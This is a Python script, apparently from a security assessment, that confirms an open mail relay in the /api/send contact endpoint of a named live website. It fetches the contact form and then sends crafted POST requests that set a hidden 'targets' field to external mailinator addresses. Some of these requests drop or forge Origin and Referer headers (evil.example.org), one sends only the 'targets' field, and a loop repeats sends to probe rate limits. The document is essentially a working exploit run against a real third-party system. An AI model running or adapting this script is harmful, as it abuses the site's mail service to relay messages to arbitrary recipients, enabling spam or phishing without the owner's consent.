#!/usr/bin/env python3
"""Independent verification of the /api/send open-relay claim on infinitycapital.bh."""
import re
import subprocess
import time

B = "https://www.infinitycapital.bh"
UA = "curl/8.5.0"
LOGP = "/work/evidence/relay_verify.log"
LOG = open(LOGP, "a")


def logit(*a):
    s = " ".join(str(x) for x in a)
    print(s)
    LOG.write(s + "\n")
    LOG.flush()


def post(form, origin=None, referer=None, ua=UA, label=""):
    body = "&".join("%s=%s" % (k, v.replace(" ", "%20").replace("@", "%40")
                               .replace("+", "%2B").replace("!", "%21"))
                    for k, v in form.items())
    cmd = ["curl", "-sk", "-X", "POST", "-A", ua, "-D", "/tmp/vr.h", "-o", "/tmp/vr.bin",
           "-w", "%{http_code}"]
    if origin:
        cmd += ["-H", "Origin: " + origin]
    if referer:
        cmd += ["-H", "Referer: " + referer]
    cmd += ["-H", "Content-Type: application/x-www-form-urlencoded",
            "--data-binary", body, B + "/api/send"]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
    code = (r.stdout or "").strip()
    raw = open("/tmp/vr.bin", "rb").read()
    hdr = open("/tmp/vr.h", "r", errors="replace").read()
    keys = ("http/", "content-type", "x-matched", "x-vercel-id", "set-cookie", "server",
            "content-length", "cf-mitigated")
    hdrs = [l.strip() for l in hdr.split("\n") if l and l.lower().startswith(keys)]
    logit("\n--- %s ---" % label)
    logit("CMD: " + " ".join(cmd))
    logit("HDR: " + " | ".join(hdrs))
    logit("BODY: " + raw.decode("utf-8", "replace")[:600])
    return code, raw


def main():
    logit("\n########## INDEPENDENT VERIFICATION %s ##########" % time.strftime("%Y-%m-%d %H:%M:%S"))

    logit("\n===== STEP 0: client-side form inspection =====")
    subprocess.run(["curl", "-sk", "-A", UA, "-o", "/tmp/contact.html", B + "/contact"], timeout=90)
    h = open("/tmp/contact.html", errors="replace").read()
    names = sorted(set(re.findall(r'name="([a-zA-Z_]+)"', h)))
    logit("contact.html field names: %s" % names)
    logit("has 'targets' field: %s" % ("targets" in names))
    for kw in ["captcha", "recaptcha", "turnstile", "hcaptcha", "csrf"]:
        logit("contact.html mentions %-10s : %s" % (kw, kw.lower() in h.lower()))

    f = {"fname": "Verifier", "lname": "Bot", "areacode": "973", "tel": "5551234",
         "cname": "QA Tester", "subject": "Verifier probe", "msg": "verifier body",
         "check": "on", "targets": "not-an-email"}
    post(f, origin=B, referer=B + "/contact", label="CONTROL invalid recipient targets=not-an-email")

    f2 = dict(f); f2["targets"] = "verifier.probe@mailinator.com"
    post(f2, origin=B, referer=B + "/contact",
         label="RELAY-1 bare external targets=verifier.probe@mailinator.com")

    f3 = dict(f); f3["targets"] = "QA Tester <verifier.probe@mailinator.com>"
    post(f3, origin=B, referer=B + "/contact", label="RELAY-2 Name<addr> external")

    f4 = dict(f); f4["targets"] = "verifier.probe@mailinator.com"
    post(f4, origin=None, referer=None, ua="python-requests/2.32.0",
         label="RELAY-3 no Origin/Referer/cookie (zero-auth client)")

    f5 = dict(f); f5["targets"] = "verifier.probe@mailinator.com"
    post(f5, origin="https://evil.example.org", referer="https://evil.example.org/x.html",
         label="RELAY-4 foreign Origin/Referer (cross-origin POST)")

    f6 = {"targets": "verifier.probe@mailinator.com"}
    post(f6, origin=B, referer=B + "/contact",
         label="RELAY-5 only 'targets' supplied, all other fields omitted")

    logit("\n===== STEP 7: repeat unauthenticated sends to observe quota / rate state =====")
    for i in range(3):
        post(dict(f, targets="verifier.probe%d@mailinator.com" % i),
             origin=B, referer=B + "/contact", label="QUOTA-PROBE #%d" % (i + 1))
        time.sleep(3)


main()
